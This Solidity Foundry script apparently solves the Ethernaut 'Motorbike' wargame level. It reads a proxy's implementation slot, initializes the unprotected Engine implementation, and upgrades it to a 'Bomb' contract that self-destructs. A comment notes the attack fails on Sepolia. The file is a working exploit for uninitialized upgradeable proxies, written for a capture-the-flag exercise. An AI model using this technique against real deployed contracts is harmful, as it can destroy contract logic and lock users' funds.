// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import {Script, console} from "forge-std/Script.sol";
import { Motorbike, Engine, myMaliciousEngine } from "../src/Motorbike.sol";

contract Bomb {
    fallback () external {
        selfdestruct(msg.sender);
    }

}

contract MotorbikeSolver is Script {

    Motorbike public instance = Motorbike(0xc4247B4b2F26DF92854BE78aE362289C75c92fd2);
    // Motorbike public instance = new Motorbike(address(new Engine()));

    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        
        bytes32 engineAddress = vm.load(address(instance), IMPLEMENTATION_SLOT);
        console.logBytes32(engineAddress);

        Engine engine = Engine(address(uint160(uint256(engineAddress))));
        
        
        // engine.initialize();
        // console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));

        
        Bomb bomb = new Bomb();
        engine.initialize();
		engine.upgradeToAndCall(address(bomb), "");

		// sepolia doesnt allow us to solve this chal !!!

        // console.logBytes32(vm.load(address(instance), IMPLEMENTATION_SLOT));




        vm.stopBroadcast();

    }

}

